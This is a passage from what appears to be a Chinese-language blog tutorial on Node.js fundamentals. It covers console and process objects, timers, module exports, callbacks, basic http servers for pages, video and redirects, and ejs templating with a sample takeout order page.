href="#console对象" class="headerlink" title="console对象"></a>console对象</h3><p>console对象用于提供控制台的标准输出</p><p>consolo对象常见的方法</p><table><thead><tr><th>方法名称</th><th>方法说明</th></tr></thead><tbody><tr><td>log()</td><td>向标准输出流打印字符并以换行符结束，该方法接收若干个参数，如果只有一个参数，则输出这个参数的字符串形式。如果有多个参数，则类似于C语言的printf()命令格式输出</td></tr><tr><td>time()</td><td>输出时间，表示计时开始</td></tr><tr><td>timeEnd()</td><td>结束时间，表示计时结束</td></tr></tbody></table><h3 id="process对象"><a href="#process对象" class="headerlink" title="process对象"></a>process对象</h3><p>process对象用于描述当前程序的状态，与console对象不用的是，process对象只是在node.js中存在的对象，在JavaScript中并不存在这个对象。</p><p>process对象中的基本属性</p><table><thead><tr><th>属性名称</th><th>说明</th></tr></thead><tbody><tr><td>argv</td><td>返回一个数组，由命令行执行脚本时的各个参数组成</td></tr><tr><td>env</td><td>返回当前系统的环境变量</td></tr><tr><td>version</td><td>返回当前node.js的版本</td></tr><tr><td>arch</td><td>返回当前cpu的架构，如“arm”或“x64”</td></tr><tr><td>platform</td><td>返回当前运行程序所在的平台系统，如“win32”或“Linux”</td></tr><tr><td>exit(code)</td><td>使用指定的code的结束进程，如果忽略，将会使用code()</td></tr><tr><td>memoryUsage()</td><td>返回一个对象，描述了Node进程所用的内存状态，单位为字节</td></tr><tr><td>uptime()</td><td>返回Node已经运行的秒数</td></tr></tbody></table><h1 id="Node-js全局函数"><a href="#Node-js全局函数" class="headerlink" title="Node.js全局函数"></a>Node.js全局函数</h1><p>Node.js全局函数</p><table><thead><tr><th>函数名称</th><th>说明</th></tr></thead><tbody><tr><td>setTimeout(cb,ms)</td><td>在指定的毫秒数后执行指定的函数。指定时间后，只执行一次</td></tr><tr><td>clearTimeout(t)</td><td>停止一个之前调用setTimeout()创建的定时器</td></tr><tr><td>setInterval(cb,ms)</td><td>在指定的毫秒(ms)数后指定函数(cb)。指定时间后，周期循环执行</td></tr></tbody></table><h1 id="模块化编程"><a href="#模块化编程" class="headerlink" title="模块化编程"></a>模块化编程</h1><h2 id="exports对象"><a href="#exports对象" class="headerlink" title="exports对象"></a>exports对象</h2><p>module.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.abs=<span class="function"><span class="keyword">function</span> (<span class="params">number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">module</span>=<span class="built_in">require</span>(<span class="string">&#x27;./module&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;abs(-273)=%d&#x27;</span>,<span class="built_in">module</span>.abs(-<span class="number">273</span>));</span><br></pre></td></tr></table></figure><p><img src="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210307132742168.png" class="lazyload" data-srcset="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210307132742168.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210307132742168"></p><h2 id="module对象"><a href="#module对象" class="headerlink" title="module对象"></a>module对象</h2><p>Node.js 提供了 exports 和 require 两个对象，其中 exports 是模块公开的接口，require 用于从外部获取一个模块的接口，即所获取模块的 exports 对象。</p><h3 id="使用exports进行模块化编程"><a href="#使用exports进行模块化编程" class="headerlink" title="使用exports进行模块化编程"></a>使用exports进行模块化编程</h3><p>hello.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.hello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hello.js 通过 exports 对象把 world 作为模块的访问接口，在 main.js 中通过 require(‘./hello’) 加载这个模块，然后就可以直接访 问 hello.js 中 exports 对象的成员函数了。</p><p>在main.js使用该模块的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp=<span class="built_in">require</span>(<span class="string">&#x27;./hello&#x27;</span>);</span><br><span class="line">tmp.hello();</span><br></pre></td></tr></table></figure><h3 id="使用module对象进行模块化编程"><a href="#使用module对象进行模块化编程" class="headerlink" title="使用module对象进行模块化编程"></a>使用module对象进行模块化编程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.js </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name;</span><br><span class="line">    <span class="built_in">this</span>.setName = <span class="function"><span class="keyword">function</span>(<span class="params">thyName</span>) </span>&#123;</span><br><span class="line">        name = thyName;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">this</span>.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;Hello &#x27;</span> + name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">module</span>.exports = Hello;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js </span></span><br><span class="line"><span class="keyword">var</span> Hello = <span class="built_in">require</span>(<span class="string">&#x27;./hello&#x27;</span>);</span><br><span class="line">hello = <span class="keyword">new</span> Hello();</span><br><span class="line">hello.setName(<span class="string">&#x27;BYVoid&#x27;</span>);</span><br><span class="line">hello.sayHello(); </span><br></pre></td></tr></table></figure><p>模块接口的唯一变化是使用 module.exports = Hello 代替了exports.hello = function(){}。 在外部引用该模块时，其接口对象就是要输出的 Hello 对象本身，而不是原先的 exports。</p><h3 id="包与安装"><a href="#包与安装" class="headerlink" title="包与安装"></a>包与安装</h3><p>在<a href="http://www.npmjs.com网站上找到对应的包/">www.npmjs.com网站上找到对应的包</a></p><p><code>npm install 包名@x.x.x --save</code></p><h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。</p><p>例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fooA</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">time</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        a=<span class="number">4</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;执行定时程序&quot;</span>)</span><br><span class="line">    &#125;,time)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;跳出时间函数&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line">time(<span class="number">3000</span>);</span><br><span class="line">fooA(a);</span><br></pre></td></tr></table></figure><p>其中setTimeout()函数为回调函数，“跳出时间函数”不会等执行完再执行，运行结果：<img src="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210308100308016.png" class="lazyload" data-srcset="/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/image-20210308100308016.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308100308016" style="zoom: 67%;"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fooA</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">time</span>(<span class="params">time,callback</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        a=<span class="number">4</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;执行定时程序以及回调函数&quot;</span>)</span><br><span class="line">        callback(a)</span><br><span class="line">    &#125;,time)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;跳出时间函数&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line">time(<span class="number">3000</span>,fooA);</span><br></pre></td></tr></table></figure><h1 id="http模块"><a href="#http模块" class="headerlink" title="http模块"></a>http模块</h1><h2 id="server对象"><a href="#server对象" class="headerlink" title="server对象"></a>server对象</h2><h3 id="server对象中的方法"><a href="#server对象中的方法" class="headerlink" title="server对象中的方法"></a>server对象中的方法</h3><p>server对象中主要使用的方法有listen()方法和close()方法，分别控制服务器的启动和关闭</p><h3 id="server对象中的事件"><a href="#server对象中的事件" class="headerlink" title="server对象中的事件"></a>server对象中的事件</h3><p>在server对象中，事件比方法更重要。因为server独享集成了EventEmitter对象，自然可以添加监听对象</p><p>server对象中主要的监听对象</p><table><thead><tr><th>事件名称</th><th>说明</th></tr></thead><tbody><tr><td>request</td><td>客户端请求触发</td></tr><tr><td>connection</td><td>客户端连接时触发</td></tr><tr><td>close</td><td>服务器关闭时触发</td></tr><tr><td>checkContinue</td><td>客户端持续连接时触发</td></tr><tr><td>upgrade</td><td>客户端请求http升级时触发</td></tr><tr><td>clientError</td><td>客户端发生错误时触发</td></tr></tbody></table><h2 id="response对象"><a href="#response对象" class="headerlink" title="response对象"></a>response对象</h2><p>response对象提供了writeHead()方法和end()方法</p><h3 id="添加网页"><a href="#添加网页" class="headerlink" title="添加网页"></a>添加网页</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> server=http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request,response</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    fs.readFile(<span class="string">&#x27;index.html&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">        response.writeHead(<span class="number">200</span>,&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line">        response.end(data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">52222</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器的地址····&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="添加视频"><a href="#添加视频" class="headerlink" title="添加视频"></a>添加视频</h3><p>添加视频将index.html换成xxx.mp4，Content-Type换成”video/mp4”</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> server=http.createServer();</span><br><span class="line"><span class="keyword">var</span> port=<span class="number">22222</span>;</span><br><span class="line">server.listen(port,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">&quot;启动服务端&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.on(<span class="string">&#x27;request&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;接受访问&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filename=<span class="string">&quot;demo.MP4&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> infile=fs.createReadStream(filename,&#123;<span class="attr">flags</span>:<span class="string">&#x27;r&#x27;</span>&#125;);</span><br><span class="line">    <span class="keyword">var</span> filelength=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> curlength=<span class="number">0</span>;</span><br><span class="line">    fs.stat(filename,<span class="function"><span class="keyword">function</span> (<span class="params">error,stats</span>)</span>&#123;</span><br><span class="line">        filelength=stats.size;</span><br><span class="line">    &#125;);</span><br><span class="line">    res.writeHeader(<span class="number">200</span>,&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;video/mp4&#x27;</span>&#125;);</span><br><span class="line">    infile.on(<span class="string">&#x27;readable&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> chunk;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">null</span>!==(chunk=infile.read()))&#123;</span><br><span class="line">            curlength+=chunk.length;</span><br><span class="line">            res.write(chunk,<span class="string">&#x27;utf-8&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;文件读取进度%d，文件大小:%d&quot;</span>,curlength,filelength);</span><br><span class="line">            <span class="keyword">if</span>(curlength&gt;=filelength)&#123;</span><br><span class="line">                res.end();</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h3><p>添加图片同理image/jpeg</p><h3 id="网页自动跳转"><a href="#网页自动跳转" class="headerlink" title="网页自动跳转"></a>网页自动跳转</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> server=http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request,response</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    response.writeHead(<span class="number">302</span>,&#123;<span class="string">&#x27;Location&#x27;</span>:<span class="string">&#x27;http://www.baidu.com&#x27;</span>&#125;);</span><br><span class="line">    response.end();</span><br><span class="line">&#125;).listen(<span class="number">52222</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器的地址····&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中的状态码：</p><p>1xx：处理中；2xx：成功；3xx：重定向；4xx：客户端错误；5xx：服务端错误</p><h3 id="request请求"><a href="#request请求" class="headerlink" title="request请求"></a>request请求</h3><p>request对象常用属性</p><table><thead><tr><th>属性名称</th><th>说明</th></tr></thead><tbody><tr><td>method</td><td>返回客户端请求方法</td></tr><tr><td>url</td><td>返回客户端请求url</td></tr><tr><td>headers</td><td>返回请求信息头</td></tr><tr><td>trailers</td><td>返回请求网络</td></tr></tbody></table><p><strong>通过浏览器输入url的方式，都是GET请求</strong></p><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request,response</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(request.method==<span class="string">&#x27;GET&#x27;</span>)&#123;</span><br><span class="line">       <span class="comment">//输入链接其实相当于一个get请求 读取index然后发送到主页</span></span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&quot;请求get&quot;</span>);</span><br><span class="line">       fs.readFile(<span class="string">&#x27;index.html&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, data</span>) </span>&#123;</span><br><span class="line">            response.writeHead(<span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line">            response.end(data);</span><br><span class="line">   &#125;);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span>(request.method==<span class="string">&#x27;POST&#x27;</span>)&#123;</span><br><span class="line">       <span class="comment">//由于按钮的提交是post请求，对request请求添加一个监听</span></span><br><span class="line">       request.on(<span class="string">&#x27;data&#x27;</span>,<span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</span><br><span class="line">            response.writeHead(<span class="number">200</span>,&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line">            response.end(<span class="string">&#x27;&lt;h1&gt;&#x27;</span>+data+<span class="string">&#x27;&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;).listen(<span class="number">52222</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务器监听地址http://127.0.0.1:52222&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中的POST请求后，拿到data，并且刷新response()</p><h1 id="web开发中的模板引擎"><a href="#web开发中的模板引擎" class="headerlink" title="web开发中的模板引擎"></a>web开发中的模板引擎</h1><h2 id="ejs模块"><a href="#ejs模块" class="headerlink" title="ejs模块"></a>ejs模块</h2><p>ejs模块中的渲染标识</p><table><thead><tr><th>标识</th><th>说明</th></tr></thead><tbody><tr><td>&lt;%Code%&gt;</td><td>输入JavaScript</td></tr><tr><td>&lt;%=Value%&gt;</td><td>输出数据，比如字符串和数字</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">index.ejs</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .info&#123;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            width: 300px;</span><br><span class="line">            border: solid blue 1px;</span><br><span class="line">            color: blue;</span><br><span class="line">        &#125;</span><br><span class="line">        .info h3&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            border-bottom: dashed blue 1px;</span><br><span class="line">        &#125;</span><br><span class="line">        .info p&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            border-bottom: dashed blue 1px;</span><br><span class="line">        &#125;</span><br><span class="line">        .info div&#123;</span><br><span class="line">             text-align: center;</span><br><span class="line">             border-bottom: dashed blue 1px;</span><br><span class="line">        &#125;</span><br><span class="line">        .info table&#123;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            text-align: center;</span><br><span class="line">            border-bottom: dashed blue 1px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section class=&quot;info&quot;&gt;</span><br><span class="line">    &lt;h3&gt;&lt;%=No%&gt;饿了么外卖&lt;/h3&gt;</span><br><span class="line">    &lt;h5&gt;下单时间&lt;%=ordertime%&gt;&lt;/h5&gt;</span><br><span class="line">    &lt;h5&gt;送啥都快，越吃越衰&lt;/h5&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;th&gt;</span><br><span class="line">            &lt;td&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;数量&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;价格&lt;/td&gt;</span><br><span class="line">        &lt;/th&gt;</span><br><span class="line">        &lt;%orderPrice.forEach(function (item)&#123;%&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;%=item.menu%&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;%=item.orederNo%&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td&gt;&lt;%=item.price%&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;%&#125;)%&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/section&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>其中的&lt;%=ordertime%&gt;在js文件进行赋值，然后<code>orderPrice.forEach</code>遍历该对象中所有的成员，然后进行赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">op.js</span><br><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">&#x27;index.ejs&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">        res.writeHead(<span class="number">200</span>,&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line">        res.end(ejs.render(data,&#123;</span><br><span class="line">            <span class="attr">No</span>:<span class="string">&#x27;2333&#x27;</span>,</span><br><span class="line">            <span class="attr">ordertime</span>:<span class="string">&#x27;2021年3月8日10:29:57&#x27;</span>,</span><br><span class="line">            <span class="attr">orderPrice</span>:[&#123;</span><br><span class="line">                <span class="attr">menu</span>:<span class="string">&quot;可乐&quot;</span>,</span><br><span class="line">                <span class="attr">orderNo</span>:<span class="number">233</span>,</span><br><span class="line">                <span class="attr">price</span>:<span class="number">20</span>,</span><br><span class="line">            &#125;,&#123;</span><br><span class="line">                <span class="attr">menu</span>:<span class="string">&quot;黄焖鸡&quot;</span>,</span><br><span class="line">                <span class="attr">orderNo</span>:<span class="number">233</span>,</span><br><span class="line">                <span class="attr">price</span>:<span class="number">200</span>,</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).listen(<span class="number">2333</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span 